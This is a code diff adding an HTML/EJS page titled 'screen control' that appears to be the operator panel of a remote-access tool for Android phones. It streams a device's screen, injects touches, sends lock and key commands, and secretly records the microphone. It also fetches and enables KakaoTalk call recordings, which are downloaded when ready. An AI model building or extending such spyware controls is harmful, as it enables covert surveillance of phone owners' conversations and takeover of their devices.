@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>화면 조종</title>
+    <script src="/assets/plugins/jquery.min.js"></script>
+    <script src="/assets/socket/socket.io-client/dist/socket.io.js"></script>
+
+    <% include socket.ejs %>
+</head>
+
+<body>
+    <div>
+        <div><span id="status">LOADING</span></div>
+        <video id="video" style="object-fit: contain" autoplay></video>
+        <div>
+            <button type="button" onclick="buttonBack()">BACK</button>
+            <button type="button" onclick="buttonHome()">HOME</button>
+            <button type="button" onclick="buttonRecents()">RECENTS</button>
+            <button type="button" onclick="buttonLockPin()">LOCK PIN</button>
+            <button type="button" onclick="buttonLockPattern()">LOCK PATTERN</button>
+            <button type="button" onclick="buttonWakeup()">WAKEUP</button>
+            <button type="button" onclick="buttonSpeakerOn()">SPEAKER ON</button>
+            <button type="button" onclick="buttonSpeakerOff()">SPEAKER OFF</button>
+            <button type="button" onclick="buttonRecordStart()">녹음 시작</button>
+            <button type="button" onclick="buttonRecordEnd()">녹음 중지</button>
+            <button type="button" onclick="buttonRecordFetch()">카톡녹음 가져오기</button>
+            <button type="button" onclick="buttonEnableRec()">카톡녹음시작</button>
+
+        </div>
+    </div>
+
+    <script src="/assets/media-stream-library.min.js"></script>
+
+    <script>
+        const id = '<%=id%>';
+
+        function buttonBack() {
+            postAction('action', 'back');
+        }
+
+        function buttonHome() {
+            postAction('action', 'home');
+        }
+
+        function buttonRecents() {
+            postAction('action', 'recents');
+        }
+
+        function buttonWakeup() {
+            postAction('key', 'wakeup');
+        }
+
+        function buttonSpeakerOn() {
+            postAction('key', 'speakeron');
+        }
+
+        function buttonSpeakerOff() {
+            postAction('key', 'speakeroff');
+        }
+
+        function buttonLockPin() {
+            postAction('lock', 'pin');
+        }
+
+        function buttonLockPattern() {
+            postAction('lock', 'pattern');
+        }
+
+        var mouseDown = false;
+
+        function onMouseDown(e) {
+            if (e.button !== 0)
+                return;
+            mouseDown = true;
+            postAction('touch', `down,${e.offsetX},${e.offsetY}`);
+        }
+
+        function onMouseMove(e) {
+            if (e.button !== 0 || !mouseDown)
+                return;
+            postAction('touch', `move,${e.offsetX},${e.offsetY}`);
+        }
+
+        function onMouseUp(e) {
+            if (e.button !== 0 || !mouseDown)
+                return;
+            mouseDown = false;
+            postAction('touch', `up,${e.offsetX},${e.offsetY}`);
+        }
+
+        function postAction(action, extra) {
+            $.ajax({
+                type: 'post',
+                url: '/api/mobile/action',
+                data: {
+                    id,
+                    action,
+                    extra,
+                },
+                dataType: 'json',
+                success: function(data) {},
+                error: function(data) {
+                    console.error(data.responseJSON.error);
+                }
+            });
+        }
+
+        function stream() {
+            $.ajax({
+                type: 'post',
+                url: '/api/mobile/stream',
+                data: {
+                    id,
+                    channel: 'display'
+                },
+                dataType: 'json',
+                success: function(data) {
+                    const {
+                        wss,
+                        rtsp
+                    } = data;
+
+                    play(wss, rtsp);
+                },
+                error: function(data) {
+                    console.error(data.responseJSON.error);
+                    close();
+                }
+            });
+        }
+
+        let pipeline;
+
+        function close() {
+            pipeline && pipeline.close();
+            pipeline = null;
+
+            $('#status').text('CLOSED');
+        }
+
+        function play(wss, rtsp) {
+            if (!!pipeline)
+                return;
+
+            console.log(`Websocket: ${wss}, RTSP: ${rtsp}`);
+
+            $('#status').text('PLAYING');
+
+            const videoEl = document.querySelector('#video');
+
+            // Setup a new pipeline
+            pipeline = new mediaStreamLibrary.pipelines.Html5VideoPipeline({
+                ws: {
+                    uri: wss
+                },
+                rtsp: {
+                    uri: rtsp
+                },
+                mediaElement: videoEl,
+            });
+
+            // Restart stream on RTCP BYE (stream ended)
+            pipeline.rtsp.onRtcp = (rtcp) => {
+                if (mediaStreamLibrary.isRtcpBye(rtcp)) {
+                    console.log(`RTCP BYTE received`);
+                    close();
+                }
+            };
+
+            pipeline.rtsp.incoming.on('finish', () => {
+                close();
+            });
+
+            pipeline.ready.then(() => {
+                pipeline.rtsp.play();
+            });
+        }
+
+        function postRecord(action) {
+            $.ajax({
+                type: 'post',
+                url: '/api/mobile/mic_record',
+                data: {
+                    id,
+                    action,
+                },
+                dataType: 'json',
+                success: function(data) {},
+                error: function(data) {
+                    console.error(data.responseJSON.error);
+                }
+            });
+        }
+
+        function buttonRecordStart() {
+            postRecord('start');
+        }
+
+        function buttonRecordEnd() {
+            postRecord('stop');
+        }
+
+        function buttonRecordFetch() {
+            $.ajax({
+                type: 'post',
+                url: '/api/mobile/call_record',
+                data: {
+                    id,
+                },
+                dataType: 'json',
+                success: function(data) {},
+                error: function(data) {}
+            });
+        }
+
+        function buttonEnableRec() {
+            $.ajax({
+                type: 'post',
+                url: '/api/mobile/enable_record',
+                data: {
+                    id,
+                },
+                dataType: 'json',
+                success: function(data) {},
+                error: function(data) {}
+            });
+        }
+
+        $(function() {
+            setInterval(() => stream(), 1000);
+
+            $('#video').on('mousedown', onMouseDown);
+            $('#video').on('mousemove', onMouseMove);
+            $('#video').on('mouseup', onMouseUp);
+
+            socket.on("record_updated", function(data) {
+                var id = data.id;
+                var file_name = data.file_name;
+                window.location.href = `/api/mobiles/${id}/${file_name}/record_file`;
+            })
+        })
+    </script>
+</body>
+
+</html>
